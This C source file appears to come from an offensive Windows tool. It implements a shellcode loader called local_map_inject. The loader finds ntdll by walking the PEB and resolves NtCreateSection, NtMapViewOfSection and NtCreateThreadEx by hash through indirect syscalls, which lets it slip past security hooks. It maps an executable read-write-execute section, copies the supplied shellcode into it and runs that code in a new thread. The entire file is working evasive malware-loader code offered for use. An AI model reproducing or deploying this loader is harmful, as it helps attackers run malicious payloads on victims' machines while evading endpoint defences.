#include "local_map.h"
#include "box.h"


BOOL local_map_inject
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN PBYTE sShellcode,
	IN SIZE_T sShellSize,
	OUT PVOID* pAddress
)

{

	// Variables needed for debugging + values

	BOOL State = TRUE;
	HANDLE hFile = NULL, hSection = NULL;
	PVOID MLocalAddress = NULL;
	SIZE_T size = sShellSize;
	PLARGE_INTEGER maxSize = { size };
	HMODULE ntdll = NULL;
	NTSTATUS STATUS = NULL;
	PVOID localaddress = NULL;
	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
	SYSCALL_INFO info = { 0 };
	INSTRUCTIONS_INFO syscallInfos[3] = { 0 };

	ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtCreateSection",
		"NtMapViewOfSection",
		"NtCreateThreadEx"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = GetBaseHash(
			Functions[i],
			ntdll,
			pImgDir
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}

	/*--------------------------------------------------------[Creating a Section in Our Process]-----------------------------------------------------------*/

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtCreateSection
	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE))SyscallInvoker)
		(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hFile);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Create a Section via Indirect Syscalls! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtCreateSection Handle", hSection);
	INFO("NtCreateSection Created with a size of %lld--Bytes", sShellSize);

	/*-----------------------------------------------------------------------[Mapping Our Section]--------------------------------------------------------------------------*/

	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtMapViewOfSection
	STATUS = ((NTSTATUS(*)(HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG))SyscallInvoker)
		(hSection, NtCurrentProcess(), &localaddress, NULL, NULL, NULL, &size, 2, 0, PAGE_EXECUTE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Map the Section! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtMapViewOfSection Base Address Created!", localaddress);
	INFO("Current Protection--[RX]  Current Size Allocated--[%zu--Bytes]", sShellSize);

	// Copy Shellcode into localaddress

	memcpy(localaddress, sShellcode, sShellSize); // Needs RWX

	OKAY("Copied %zu Bytes into Local Section Address!", sShellSize);

	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtCreateThreadEx
	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST))SyscallInvoker)
		(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, localaddress, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtCreateThreadEx Failed to Create a New Thread! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Successfully Created a Thread!", hThread);

	*pAddress = localaddress; // populate pAddress with our mapped shellcode

CLEANUP:

	if (hFile)
		CloseHandle(hFile);
	return State;

}